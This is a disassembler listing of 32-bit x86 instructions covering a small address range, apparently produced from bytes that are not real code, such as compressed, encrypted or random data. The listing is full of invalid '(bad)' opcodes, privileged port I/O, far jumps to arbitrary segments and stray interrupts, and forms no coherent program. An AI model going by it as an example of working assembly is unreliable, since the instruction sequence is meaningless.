  417626:	xor    ch,BYTE PTR [ecx-0x4f]
  417629:	push   0x67
  41762b:	in     al,dx
  41762c:	dec    esi
  41762d:	hlt    
  41762e:	adc    BYTE PTR [eax],ch
  417630:	call   0x709b85fc
  417635:	mov    ecx,0x9f1aedf0
  41763a:	jae    0x417658
  41763c:	outs   dx,BYTE PTR ss:[esi]
  41763e:	adc    DWORD PTR ds:0xaaff859e,esi
  417644:	xlat   BYTE PTR ds:[ebx]
  417645:	push   es
  417646:	add    bl,cl
  417648:	inc    eax
  417649:	rcr    dh,0x18
  41764c:	inc    edi
  41764d:	mov    edi,0xe664be69
  417652:	mov    cl,0x42
  417654:	and    al,BYTE PTR [ebp-0x71]
  417657:	cdq    
  417658:	inc    ebx
  417659:	push   es
  41765a:	scas   eax,DWORD PTR es:[edi]
  41765b:	fs call 0x29a22aa1
  417661:	inc    ebx
  417662:	and    al,BYTE PTR [ebp-0x36419b1b]
  417668:	add    al,0x2b
  41766a:	imul   BYTE PTR [esi+0x5]
  41766d:	cdq    
  41766e:	jp     0x4175f5
  417670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417671:	imul   ebp,DWORD PTR [edi+0x56f157d1],0x53
  417678:	mov    bl,0xd0
  41767a:	in     al,dx
  41767b:	lea    esp,[edi+0x3148a3a7]
  417681:	ins    BYTE PTR es:[edi],dx
  417682:	aas    
  417683:	push   ebx
  417684:	push   0x9ffae683
  417689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41768a:	sub    DWORD PTR [ebp+0x69201268],0xf4b670cb
  417694:	ins    BYTE PTR es:[edi],dx
  417695:	out    0x7c,al
  417697:	cwde   
  417698:	fild   QWORD PTR [edx+0x5114823b]
  41769e:	xor    ebp,esp
  4176a0:	cmp    ebp,edi
  4176a2:	add    BYTE PTR [edx-0x36],ah
  4176a5:	popf   
  4176a6:	stc    
  4176a7:	jp     0x41765b
  4176a9:	stos   DWORD PTR es:[edi],eax
  4176aa:	inc    eax
  4176ab:	jp     0x417641
  4176ad:	iret   
  4176ae:	orps   xmm4,XMMWORD PTR [edx+0x15]
  4176b2:	outs   dx,DWORD PTR ds:[esi]
  4176b3:	mov    edi,DWORD PTR [esi-0x8]
  4176b6:	push   es
  4176b7:	xchg   BYTE PTR [ebx-0x26ad30ec],dl
  4176bd:	xor    ah,bl
  4176bf:	jae    0x4176c1
  4176c1:	or     eax,0x20d41b7e
  4176c6:	dec    esp
  4176c7:	push   ecx
  4176c8:	rcr    DWORD PTR [ecx+0x5aafc65d],1
  4176ce:	jo     0x41774f
  4176d0:	ins    BYTE PTR es:[edi],dx
  4176d1:	dec    ecx
  4176d2:	retf   
  4176d3:	daa    
  4176d4:	add    DWORD PTR [ebx+0x1f],esi
  4176d7:	xor    BYTE PTR [edx+ebx*4],bh
  4176da:	data16 cld 
  4176dc:	stc    
  4176dd:	adc    eax,0xfccfbb3e
  4176e2:	jbe    0x4176fa
  4176e4:	iret   
  4176e5:	popa   
  4176e6:	jno    0x4176df
  4176e8:	add    ecx,esp
  4176ea:	cmp    al,0x97
  4176ec:	mov    BYTE PTR [eax-0x67],cl
  4176ef:	add    DWORD PTR [esi+0x62f7f9ae],0xbfe9928
  4176f9:	push   es
  4176fa:	push   edx
  4176fb:	add    bh,BYTE PTR [esi+0x6628ad3]
  417701:	sbb    edi,DWORD PTR [edi-0x60ed5de4]
  417707:	sbb    al,0x3f
  417709:	mov    bh,0x3b
  41770b:	pusha  
  41770c:	adc    dh,BYTE PTR [esi+ebp*2-0x49]
  417710:	xchg   esp,eax
  417711:	pop    esp
  417712:	xchg   DWORD PTR [ebp-0x50cc70a],ecx
  417718:	shr    BYTE PTR [eax],1
  41771a:	scas   al,BYTE PTR es:[edi]
  41771b:	and    ecx,DWORD PTR [eax+0xa98c4f1]
  417721:	mov    ds:0x7f2f9c84,eax
  417726:	inc    edi
  417727:	jmp    0x417707
  417729:	pop    ebx
  41772a:	fimul  DWORD PTR [ebx+ecx*4-0x65cad4c7]
  417731:	retf   
  417732:	xchg   esp,eax
  417733:	es es push ds
  417736:	int3   
  417737:	jne    0x4177b5
  417739:	push   0x73
  41773b:	test   BYTE PTR [eax-0x6a],cl
  41773e:	(bad)  
  41773f:	xor    al,0x39
  417741:	fcom   DWORD PTR [edi]
  417743:	cs sbb eax,0x4b9c592c
  417749:	inc    ebp
  41774a:	jb     0x41776a
  41774c:	sbb    esp,esi
  41774e:	cld    
  41774f:	out    0x24,al
  417751:	jmp    0x5cc2:0x60a92ad8
  417758:	mov    WORD PTR [eax+0x7d561041],?
  41775e:	dec    esi
  41775f:	addr16 or al,0x4
  417762:	lahf   
  417763:	jnp    0x41772e
  417765:	add    edi,DWORD PTR [edx+0xa]
  417768:	or     al,0x55
  41776a:	je     0x41776e
  41776c:	mov    edx,0x22e4bb4d
  417771:	js     0x417772
  417773:	mov    ds:0xe1d2dd95,al
  417778:	cli    
  417779:	aas    
  41777a:	int    0x10
  41777c:	ret    0x9fa6
  41777f:	push   ebx
  417780:	sub    eax,0xb37fc907
  417785:	sub    dl,BYTE PTR [edx]
  417787:	and    al,0xdc
  417789:	push   esi
  41778a:	adc    eax,0x8b6303c9
  41778f:	fisttp QWORD PTR [edi]
  417791:	pop    eax
  417792:	test   DWORD PTR [ebp+0x2],ecx
  417795:	xor    eax,0x435b8969
  41779a:	pop    es
  41779b:	inc    eax
  41779c:	clc    
  41779d:	cmp    ebx,DWORD PTR [edx-0x30]
  4177a0:	mov    ds:0xdd40cd77,al
  4177a5:	sub    BYTE PTR [ebx-0x4fd6037c],ah
  4177ab:	pop    edi
  4177ac:	jns    0x41776e
  4177ae:	ins    DWORD PTR es:[edi],dx
  4177af:	test   eax,0xccde038f
  4177b4:	test   al,0xdd
  4177b6:	lods   eax,DWORD PTR ds:[esi]
  4177b7:	mov    esp,DWORD PTR [ebp-0xb]
  4177ba:	popa   
  4177bb:	adc    al,0x3b
  4177bd:	and    BYTE PTR [ecx-0x7d],0xc8
  4177c1:	shl    ebx,0x8c
  4177c4:	in     al,0xd0
  4177c6:	mov    esi,0x127f0ba8
  4177cb:	mov    dh,0x33
  4177cd:	sbb    dl,BYTE PTR [esp+eiz*8-0x36]
  4177d1:	aas    
  4177d2:	fbstp  TBYTE PTR [ebx+0x23b9066f]
  4177d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177d9:	push   0xfffffffc
  4177db:	pusha  
  4177dc:	xor    BYTE PTR [edi-0x70],0x67
  4177e0:	mov    ds:0x1f1cfe2b,eax
  4177e5:	(bad)  
  4177e6:	in     al,0x26
  4177e8:	sti    
  4177e9:	(bad)  
  4177ea:	enter  0x5a4,0x7e
  4177ee:	xor    ah,BYTE PTR [edi+0x64]
  4177f1:	sub    al,0xfa
  4177f3:	inc    BYTE PTR [ebx]
  4177f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177f6:	fsubr  QWORD PTR [esi-0x41]
  4177f9:	inc    edx
  4177fa:	fcmovnu st,st(0)
  4177fc:	jmp    0x773202d0
  417801:	jmp    0xab02:0x77b5fa8f
  417808:	imul   edi
  41780a:	pushf  
  41780b:	and    DWORD PTR [edx-0x2e],ebp
  41780e:	mov    dl,al
  417810:	or     dl,BYTE PTR [ebp+0x7d16e72b]
  417816:	jmp    0x4177b5
  417818:	mov    dh,0x70
  41781a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41781b:	mov    dl,0x2f
  41781d:	outs   dx,BYTE PTR ds:[esi]
  41781e:	pop    es
  41781f:	into   
  417820:	mov    cl,0x35
  417822:	or     eax,0x9b5e3876
  417827:	jbe    0x4177ab
  417829:	push   ebx
  41782a:	pop    esp
  41782b:	fnsave [esi]
  41782d:	popf   
  41782e:	adc    al,0xff
  417830:	xchg   edi,eax
  417831:	(bad)
  417836:	leave  
  417837:	xchg   esi,eax
  417838:	ins    BYTE PTR es:[edi],dx
  417839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783a:	push   0xffffffa8
  41783c:	mov    gs,WORD PTR [ecx+0x1d]
  41783f:	cdq    
  417840:	gs into 
  417842:	add    cl,BYTE PTR [edx-0x6e717237]
  417848:	out    dx,eax
  417849:	jle    0x417888
  41784b:	push   ecx
  41784c:	stos   BYTE PTR es:[edi],al
  41784d:	(bad)  [ecx-0x20bbae15]
  417853:	adc    ebx,DWORD PTR [edx]
  417855:	lock ins DWORD PTR es:[edi],dx
  417857:	popa   
  417858:	pushf  
  417859:	aad    0xf
  41785b:	add    ah,BYTE PTR [ebx-0x36ba094b]
  417861:	mov    edx,edi
  417863:	ret    0xf73d
  417866:	lock leave 
  417868:	addr16 sub esp,eax
  41786b:	mov    ds:0x60ce6979,eax
  417870:	cmp    DWORD PTR [eax+0x5f],ebp
  417873:	mov    al,0x52
  417875:	in     al,dx
  417876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417877:	jno    0x4178d9
  417879:	sbb    BYTE PTR [edx-0x421e55b],dl
  41787f:	outs   dx,BYTE PTR ds:[esi]
  417880:	push   edx
  417881:	add    bh,BYTE PTR [edx+0x48246c99]
  417887:	sbb    BYTE PTR [ebx+0x1284941f],ch
  41788d:	inc    esi
  41788e:	(bad)
  417892:	neg    BYTE PTR [eax]
  417894:	xor    edx,0xfffffff3
  417897:	imul   ebx,DWORD PTR [edi+0x10],0x10dc88e
  41789e:	retf   
  41789f:	or     esp,edx
  4178a1:	es ins BYTE PTR es:[edi],dx
  4178a3:	and    eax,0xba9b7c05
  4178a8:	inc    esi
  4178a9:	hlt    
  4178aa:	and    dl,ch
  4178ac:	dec    esp
  4178ad:	adc    al,0x8c
  4178af:	fwait
  4178b0:	jae    0x4178d6
  4178b2:	inc    ecx
  4178b3:	dec    ecx
  4178b4:	add    DWORD PTR [edx-0x49b1a213],edi
  4178ba:	mov    ds:0x69dc0687,eax
  4178bf:	data16 (bad) 
  4178c1:	or     ecx,DWORD PTR [ebx]
  4178c3:	test   al,0x45
  4178c5:	jmp    0xb856c03f
  4178ca:	out    dx,al
  4178cb:	jg     0x41788a
  4178cd:	inc    ebx
  4178ce:	and    ebp,DWORD PTR [edi]
  4178d0:	mov    ebp,0x8a19e88a
  4178d5:	push   edx
  4178d6:	xchg   esi,eax
  4178d7:	push   es
  4178d8:	inc    esi
  4178d9:	sub    DWORD PTR [ebx],edx
  4178db:	scas   eax,DWORD PTR es:[edi]
  4178dc:	pop    ebx
  4178dd:	aad    0x5
  4178df:	mov    eax,ds:0xb2b4a688
  4178e4:	dec    esi
  4178e5:	adc    eax,0xb5bea094
  4178ea:	mov    esp,0xcb6ac7f8
  4178ef:	push   0xffffffa3
  4178f1:	vmread DWORD PTR [edx+0x2eec35d6],edi
  4178f8:	xchg   ecx,eax
  4178f9:	retf   
  4178fa:	call   FWORD PTR ds:0x4ab8cabd
  417900:	in     eax,dx
  417901:	lods   eax,DWORD PTR ds:[esi]
  417902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417903:	push   es
  417904:	test   al,0xd3
  417906:	clc    
  417907:	js     0x417955
  417909:	pusha  
  41790a:	stos   DWORD PTR es:[edi],eax
  41790b:	push   ss
  41790c:	xor    ch,BYTE PTR [edx]
  41790e:	xchg   esi,eax
  41790f:	clc    
  417910:	sub    BYTE PTR [eax+0x3d7c614c],0xd9
  417917:	aaa    
  417918:	push   eax
  417919:	fcom   QWORD PTR [edi+0x5c]
  41791c:	rol    BYTE PTR [ecx-0x4e],1
  41791f:	mov    bh,0xc1
  417921:	int    0x40
  417923:	scas   al,BYTE PTR es:[edi]
  417924:	nop
  417925:	les    ebp,FWORD PTR [eax]
  417927:	adc    eax,0xf09e1d7b
  41792c:	sbb    al,0xd
  41792e:	xchg   esi,eax
  41792f:	lods   al,BYTE PTR ds:[esi]
  417930:	int    0xb3
  417932:	mov    DWORD PTR [ebx],esi
  417934:	jbe    0x417924
  417936:	inc    ebx
  417937:	es mov dh,0x17
  41793a:	inc    edx
  41793b:	hlt    
  41793c:	aaa    
  41793d:	mov    ecx,0xe5734866
  417942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417943:	cmp    BYTE PTR [esi-0x50],bl
  417946:	cld    
  417947:	sahf   
  417948:	xchg   BYTE PTR [esi-0x26534500],ah
  41794e:	inc    esp
  41794f:	lahf   
  417950:	inc    ebx
  417951:	fisttp QWORD PTR [ecx]
  417953:	cmp    ecx,esp
  417955:	jae    0x4179ce
  417957:	int    0xad
  417959:	mov    edx,0x8d203d53
  41795e:	lods   eax,DWORD PTR ds:[esi]
  41795f:	cmp    al,0x9e
  417961:	fist   WORD PTR [esi+0x204ca1dd]
  417967:	addr16 retf 0x954e
  41796b:	lock xor edi,DWORD PTR [ecx+ebx*1]
  41796f:	xor    edi,esp
  417971:	rcr    BYTE PTR [ecx-0x3a],1
  417974:	outs   dx,WORD PTR ds:[esi]
  417976:	mov    eax,eax
  417978:	les    edi,FWORD PTR gs:[edi+0x34]
  41797c:	or     al,0x56
  41797e:	or     edx,esp
  417980:	test   eax,0xf114e35c
  417985:	cli    
  417986:	(bad)  
  417987:	out    0x29,eax
  417989:	call   0x9975:0x6fd0c112
  417990:	(bad)  
  417991:	mov    eax,0xc01f33c8
  417996:	jl     0x4179a8
  417998:	fdiv   DWORD PTR [esi]
  41799a:	test   eax,0xcee072b7
  41799f:	xor    eax,0xd90d52b9
  4179a4:	inc    esi
  4179a5:	adc    al,0xe
  4179a7:	or     DWORD PTR ds:[esi+0x36],eax
  4179ab:	jecxz  0x4179cc
  4179ad:	inc    esi
  4179ae:	push   0xd2ce9b8a
  4179b3:	ins    BYTE PTR es:[edi],dx
  4179b4:	mov    esp,DWORD PTR [edx-0x5540bfa1]
  4179ba:	add    BYTE PTR [edx+0x4d5ce634],ch
  4179c0:	mov    esi,0x24f85e35
  4179c5:	mov    eax,ds:0x2660ba2
  4179ca:	in     al,0x30
  4179cc:	(bad)  
  4179cd:	jmp    0xbb069dd1
  4179d2:	in     al,0x74
  4179d4:	lahf   
  4179d5:	cmovno ebx,DWORD PTR [ebp+0x7ad4f849]
  4179dc:	outs   dx,BYTE PTR ds:[esi]
  4179dd:	xchg   edx,eax
  4179de:	les    ebx,FWORD PTR [ebx+0xeb51406]
  4179e4:	inc    edx
  4179e5:	sub    eax,0x6431a0cc
  4179ea:	mov    ?,WORD PTR [eax]
  4179ec:	sbb    eax,0xb4decd5f
  4179f1:	nop
  4179f2:	addr16 js 0x4179d2
  4179f5:	retf   
  4179f6:	or     DWORD PTR [edx+0x48faac09],ebx
  4179fc:	pop    es
  4179fd:	inc    ecx
  4179fe:	(bad)  
  4179ff:	ins    BYTE PTR es:[edi],dx
  417a00:	outs   dx,DWORD PTR ds:[esi]
  417a01:	cmc    
  417a02:	call   0x4a2a:0x51ffc6cf
  417a09:	mov    fs,esi
  417a0b:	jbe    0x4179b2
  417a0d:	xor    eax,0x4b217e92
  417a12:	outs   dx,DWORD PTR ds:[esi]
  417a13:	dec    ecx
  417a14:	je     0x4179e7
  417a16:	sub    al,0xa4
  417a18:	and    DWORD PTR [eax],esp
  417a1a:	icebp  
  417a1b:	js     0x41799d
  417a1d:	sti    
  417a1e:	jo     0x417a1f
  417a20:	movmskps ebp,xmm5
  417a23:	add    al,0x17
  417a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a26:	fs scas al,BYTE PTR es:[edi]
  417a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a29:	pop    esp
  417a2a:	mov    esi,0x38b70489
  417a2f:	add    al,0x11
  417a31:	mov    eax,0x7a42c327
  417a36:	popf   
  417a37:	arpl   WORD PTR [esp+ebx*4+0x43da9d72],cx
  417a3e:	adc    bl,ch
  417a40:	test   DWORD PTR [ecx],0x47292501
  417a46:	add    eax,DWORD PTR [edi-0x63]
  417a49:	aaa    
  417a4a:	lahf   
  417a4b:	in     eax,0xbb
  417a4d:	jmp    0xaf82:0x48b49341
  417a54:	out    0xe1,al
  417a56:	adc    edx,DWORD PTR [ecx+0x18cf7410]
  417a5c:	rcl    esp,1
  417a5e:	sub    ebp,edx
  417a60:	add    BYTE PTR [edx+0x4a80fdf2],al
  417a66:	cmp    DWORD PTR [ecx+0x2e],ecx
  417a69:	xor    eax,DWORD PTR [ebx+0x5c]
  417a6c:	jae    0x417a6a
  417a6e:	push   edx
  417a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a70:	sbb    DWORD PTR [ebx-0x26],0x601b7b0f
  417a77:	mov    ah,0x3d
  417a79:	add    BYTE PTR [ebx+0x2e],bh
  417a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a7d:	or     esi,DWORD PTR [edx-0x24]
  417a80:	push   ss
  417a81:	out    0xf7,eax
  417a83:	lds    eax,FWORD PTR [ecx]
  417a85:	inc    eax
  417a86:	mov    dh,0xf
  417a88:	and    eax,0x1cc4dac1
  417a8d:	xor    eax,0x2876bf9
  417a92:	push   0xffffff92
  417a94:	mov    dl,0x7
  417a96:	mov    dh,0x44
  417a98:	cmp    dh,0xcb
  417a9b:	imul   eax,DWORD PTR [edi],0x78
  417a9e:	iret   
  417a9f:	arpl   WORD PTR [esi-0x5cb57c22],dx
  417aa5:	mov    dl,0xb0
  417aa7:	and    edi,DWORD PTR [ebx+eax*8+0x356c3c82]
  417aae:	jb     0x417a52
  417ab0:	ret    0x2462
  417ab3:	xor    al,0xd
  417ab5:	test   BYTE PTR [edi],al
  417ab7:	pop    ebp
  417ab8:	mov    ds:0xcf773092,eax
  417abd:	mov    esp,0x4eb4e3fa
  417ac2:	or     bl,BYTE PTR ds:0x29e08118
  417ac8:	cmp    BYTE PTR [esi],ah
  417aca:	pop    ebp
  417acb:	or     ch,ch
  417acd:	mov    ecx,0xd93e53f3
  417ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ad3:	sub    eax,0xf9e69ce9
  417ad8:	fcomp  DWORD PTR [eax+0x51]
  417adb:	jno    0x417af0
  417add:	cli    
  417ade:	sar    dh,0x15
  417ae1:	add    BYTE PTR [edx+edi*1],al
  417ae4:	push   ebx
  417ae5:	(bad)  
  417ae6:	jmp    0xa7cf:0x3415cd79
  417aed:	pop    ebp
  417aee:	xor    dl,BYTE PTR [edx+0x7e2fb508]
  417af4:	mov    BYTE PTR [edx],cl
  417af6:	(bad)  
  417af7:	out    dx,eax
  417af8:	xor    eax,DWORD PTR [edi]
  417afa:	dec    edx
  417afb:	xor    al,0xb6
  417afd:	enter  0xf6ab,0x67
  417b01:	mov    eax,0xffb706f6
  417b06:	iret   
  417b07:	jg     0x417b70
  417b09:	popa   
  417b0a:	mov    eax,0xbd21f0d7
  417b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b10:	push   0xffffffe5
  417b12:	adc    BYTE PTR [edi+ebp*8],bl
  417b15:	pop    eax
  417b16:	mov    esp,0xcbcdb375
  417b1b:	retf   0xa134
  417b1e:	sub    DWORD PTR [ecx+0x16fa2c08],0x33
  417b25:	jg     0x417b84
  417b27:	xor    DWORD PTR [edi],eax
  417b29:	lds    eax,FWORD PTR [ecx+0x3ea4c1ee]
  417b2f:	jb     0x417b42
  417b31:	icebp  
  417b32:	add    BYTE PTR [edx+0x7066f4c],ah
  417b38:	in     eax,dx
  417b39:	jb     0x417ad8
  417b3b:	pop    esp
  417b3c:	test   DWORD PTR [edx+0x78],eax
  417b3f:	xchg   edx,eax
  417b40:	(bad)  
  417b41:	shl    eax,cl
  417b43:	in     eax,0x53
  417b45:	jb     0x417b51
  417b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b48:	mov    WORD PTR [edx-0x33248161],ss
  417b4e:	les    esi,FWORD PTR [edx]
  417b50:	sbb    dl,BYTE PTR [edx]
  417b52:	js     0x417b20
  417b54:	sbb    ah,dh
  417b56:	cmp    eax,0xcbe5350b
  417b5b:	mov    gs,WORD PTR [esi]
  417b5d:	jae    0x417bde
  417b5f:	pop    esi
  417b60:	fst    DWORD PTR [edi-0x22]
  417b63:	mov    al,0xd5
  417b65:	fcomp  DWORD PTR [esi+edx*8+0x67]
  417b69:	xor    edx,esi
  417b6b:	(bad)  
  417b6c:	iret   
  417b6d:	mov    ebp,DWORD PTR [ecx+0x3ff7ca35]
  417b73:	scas   al,BYTE PTR es:[edi]
  417b74:	adc    eax,0x669a4693
  417b79:	pop    esi
  417b7a:	pop    ebp
  417b7b:	push   cs
  417b7c:	cmp    DWORD PTR [ebp+0x41],eax
  417b7f:	inc    eax
  417b80:	ss xchg ebx,eax
  417b82:	jno    0x417b70
  417b84:	mov    edi,0x6f4ce2d
  417b89:	rcl    BYTE PTR [edx],0x6
  417b8c:	jns    0x417b35
  417b8e:	fcmove st,st(1)
  417b90:	pop    es
  417b91:	test   edx,edx
  417b93:	(bad)  
  417b94:	mov    al,0xa4
  417b96:	mov    esp,0x1c15de75
  417b9b:	hlt    
  417b9c:	in     eax,dx
  417b9d:	push   esp
  417b9e:	jae    0x417b5a
  417ba0:	dec    ebp
  417ba1:	js     0x417bdb
  417ba3:	arpl   WORD PTR [edx+0x60065861],sp
  417ba9:	cmp    edx,DWORD PTR ss:[ebx+ebp*1]
  417bad:	jne    0x417b39
  417baf:	and    al,BYTE PTR [edx+0x63]
  417bb2:	bound  esi,QWORD PTR ds:0x4c5877f2
  417bb8:	daa    
  417bb9:	sub    DWORD PTR [edx],ecx
  417bbb:	push   ecx
  417bbc:	adc    dh,BYTE PTR [ebx]
  417bbe:	(bad)  
  417bbf:	out    0x6b,al
  417bc1:	cmp    BYTE PTR [eax-0x77],cl
  417bc4:	call   FWORD PTR [esi-0x21663f9c]
  417bca:	fidiv  DWORD PTR [ecx]
  417bcc:	stc    
  417bcd:	out    0xca,eax
  417bcf:	int    0xa1
  417bd1:	sub    eax,0x13b6c1dd
  417bd6:	or     al,0x13
  417bd8:	dec    edx
  417bd9:	xchg   edi,eax
  417bda:	ins    DWORD PTR es:[edi],dx
  417bdb:	mov    DWORD PTR [edi-0x67],edx
  417bde:	test   eax,0x6ee53620
  417be3:	ins    DWORD PTR es:[edi],dx
  417be4:	pop    ecx
  417be5:	out    0x28,eax
  417be7:	ins    DWORD PTR es:[edi],dx
  417be8:	rcl    DWORD PTR [ecx],cl
  417bea:	inc    edx
  417beb:	xchg   ebx,eax
  417bec:	repnz test al,0xff
  417bef:	ret    
  417bf0:	xchg   esi,eax
  417bf1:	stos   BYTE PTR es:[edi],al
  417bf2:	scas   al,BYTE PTR es:[edi]
  417bf3:	mov    al,0x1
  417bf5:	mov    dh,0x4b
  417bf7:	gs pop ss
  417bf9:	push   cs
  417bfa:	pop    ds
  417bfb:	shl    DWORD PTR [ebp+0x1c],0xf0
  417bff:	loope  0x417b81
  417c01:	sbb    dh,BYTE PTR gs:[ecx+ecx*1+0x3a79a587]
  417c09:	jne    0x417c20
  417c0b:	add    al,0x12
  417c0d:	inc    edx
  417c0e:	mov    WORD PTR [eax+0x69],ds
  417c11:	push   ds
  417c12:	and    BYTE PTR [ebp+0x7a20b63a],cl
  417c18:	shr    bh,0x71
  417c1b:	jle    0x417bbe
  417c1d:	or     bl,0x1f
  417c20:	std    
  417c21:	scas   eax,DWORD PTR es:[edi]
  417c22:	jne    0x417c9e
  417c24:	stc    
  417c25:	xor    eax,0xeddd33d8
  417c2a:	sub    DWORD PTR [ebx-0x11cbb05d],esi
  417c30:	repz hlt 
  417c32:	popf   
  417c33:	jb     0x417c99
  417c35:	mov    dh,0x8b
  417c37:	mov    fs,WORD PTR [eax]
  417c39:	adc    eax,0x2579529f
  417c3e:	jo     0x417bf2
  417c40:	lods   eax,DWORD PTR ds:[esi]
  417c41:	mov    ch,0x5f
  417c43:	stc    
  417c44:	loopne 0x417c08
  417c46:	xlat   BYTE PTR ds:[ebx]
  417c47:	retf   0xd985
  417c4a:	outs   dx,DWORD PTR ds:[si]
  417c4c:	mov    ch,0x8e
  417c4e:	outs   dx,BYTE PTR ds:[esi]
  417c4f:	cmc    
  417c50:	adc    eax,0x70126b2f
  417c55:	add    DWORD PTR [edx],esi
  417c57:	xchg   ebx,eax
  417c58:	pushf  
  417c59:	xchg   ebx,eax
  417c5a:	inc    DWORD PTR [ebp+0x5f311135]
  417c60:	mov    esi,0xc9b00320
  417c65:	aam    0x34
  417c67:	mov    BYTE PTR fs:[eax-0x7f1e6a65],al
  417c6e:	push   esi
  417c6f:	xchg   ch,bh
  417c71:	out    0x71,eax
  417c73:	jg     0x417c1e
  417c75:	pop    eax
  417c76:	lea    esp,[edx-0x6b]
  417c79:	iret   
  417c7a:	push   ebx
  417c7b:	and    eax,0x1b19c8a1
  417c80:	and    BYTE PTR [edx-0x73d617a8],al
  417c86:	jmp    0x417cd8
  417c88:	sub    BYTE PTR [ebx-0x680f14c9],dh
  417c8e:	ret    
  417c8f:	fwait
  417c90:	into   
  417c91:	and    dh,BYTE PTR [ecx+0x6851fa1b]
  417c97:	mov    ecx,0xdf8856de
  417c9c:	fs pop esi
  417c9e:	ret    0xea80
  417ca1:	mov    bl,0x5c
  417ca3:	loope  0x417cb5
  417ca5:	cld    
  417ca6:	xchg   edi,eax
  417ca7:	stc    
  417ca8:	outs   dx,BYTE PTR ds:[esi]
  417ca9:	push   eax
  417caa:	jne    0x417cba
  417cac:	fld    QWORD PTR ds:0x5e0bc578
  417cb3:	xchg   edx,eax
  417cb4:	bound  ebx,QWORD PTR [ebp+0x4f]
  417cb7:	jne    0x417d12
  417cb9:	dec    eax
  417cba:	dec    edx
  417cbb:	sbb    ecx,DWORD PTR ss:[eax+0x3b]
  417cbf:	dec    edx
  417cc0:	(bad)  
  417cc1:	sub    dl,BYTE PTR [ebx-0x7d]
  417cc4:	jo     0x417c6a
  417cc6:	bound  edi,QWORD PTR [esi]
  417cc8:	fsub   st(0),st
  417cca:	xor    bl,al
  417ccc:	add    al,0xa5
  417cce:	(bad)  
  417cd1:	ret    0x1ceb
  417cd4:	(bad)  
  417cd5:	cld    
  417cd6:	cmc    
  417cd7:	or     esi,edi
  417cd9:	enter  0xc632,0x24
  417cdd:	xchg   edx,eax
  417cde:	xor    edi,DWORD PTR [ecx-0x7b033537]
  417ce4:	mov    ch,0x4d
  417ce6:	push   eax
  417ce7:	xor    DWORD PTR [eax],edx
  417ce9:	xchg   ebp,eax
  417cea:	push   ss
  417ceb:	sub    al,0x49
  417ced:	arpl   WORD PTR [ebx-0x45868b37],sp
  417cf3:	mov    ds:0x2c8ebabc,al
  417cf8:	push   ecx
  417cf9:	sbb    al,0x92
  417cfb:	xor    eax,0x2c7b76d6
  417d00:	dec    eax
  417d01:	in     al,dx
  417d02:	(bad)  
  417d03:	in     ax,0x32
  417d06:	fadd   st(2),st
  417d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d09:	xchg   esp,eax
  417d0a:	test   eax,0x21707ba3
  417d0f:	fnsave [eax+0x4ab266ee]
  417d15:	lock neg BYTE PTR [edx-0x8daf149]
  417d1c:	inc    ecx
  417d1d:	imul   ebp,DWORD PTR [eax],0x649abb86
  417d23:	(bad)  
  417d24:	(bad)  
  417d25:	xlat   BYTE PTR ds:[ebx]
  417d26:	add    DWORD PTR [edi],eax
  417d28:	mov    bl,0xe
  417d2a:	lds    esp,FWORD PTR [edx-0x4e500554]
  417d30:	cdq    
  417d31:	mov    ah,0xc6
  417d33:	stos   BYTE PTR es:[edi],al
  417d34:	inc    ebx
  417d35:	and    BYTE PTR [ecx-0x27],al
  417d38:	sahf   
  417d39:	dec    esp
  417d3a:	xor    al,0xe6
  417d3c:	xchg   ebp,eax
  417d3d:	fisttp DWORD PTR [esi]
  417d3f:	pop    esi
  417d40:	call   0x2b08e60b
  417d45:	inc    ecx
  417d46:	out    dx,eax
  417d47:	pop    eax
  417d48:	pop    eax
  417d49:	jecxz  0x417d3b
  417d4b:	or     al,0x10
  417d4d:	sbb    eax,DWORD PTR [edx+0x959169]
  417d53:	mov    edi,0xcd70d72e
  417d58:	call   0x87a28e4d
  417d5d:	sbb    eax,0xa07a5f23
  417d62:	call   0x5ecd:0xc3cc52ba
  417d69:	pop    edx
  417d6a:	jb     0x417d7a
  417d6c:	xchg   edx,eax
  417d6d:	int3   
  417d6e:	ret    
  417d6f:	fisttp QWORD PTR [edx-0x3d]
  417d72:	sub    DWORD PTR ds:0xd2122ee4,esp
  417d78:	cmp    al,0x83
  417d7a:	lods   eax,DWORD PTR ds:[esi]
  417d7b:	pop    eax
  417d7c:	hlt    
  417d7d:	sahf   
  417d7e:	sub    edi,DWORD PTR [ebx+esi*8]
  417d81:	cwde   
  417d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d83:	xor    al,0xae
  417d85:	sar    BYTE PTR [esi],cl
  417d87:	inc    ebx
  417d88:	add    eax,DWORD PTR [edi-0x4de94680]
  417d8e:	pop    esi
  417d8f:	btr    DWORD PTR [edx+0x39],eax
  417d93:	add    eax,0xd901e38a
  417d98:	or     eax,DWORD PTR [edi+0x44]
  417d9b:	mov    bl,0x92
  417d9d:	lods   al,BYTE PTR ds:[esi]
  417d9e:	cmp    ebx,DWORD PTR [edx-0x28]
  417da1:	rcr    DWORD PTR [ebp-0x20],0xd4
  417da5:	add    al,0x11
  417da7:	fmul   QWORD PTR [edx+0x7f670469]
  417dad:	xchg   esp,eax
  417dae:	xchg   ecx,eax
  417daf:	sti    
  417db0:	mov    edx,0x257e0d89
  417db5:	push   esp
  417db6:	xor    BYTE PTR [esi+0x7b],ch
  417db9:	adc    esp,DWORD PTR [ecx-0x6f4aec8c]
  417dbf:	xor    esp,DWORD PTR [edx-0x57191155]
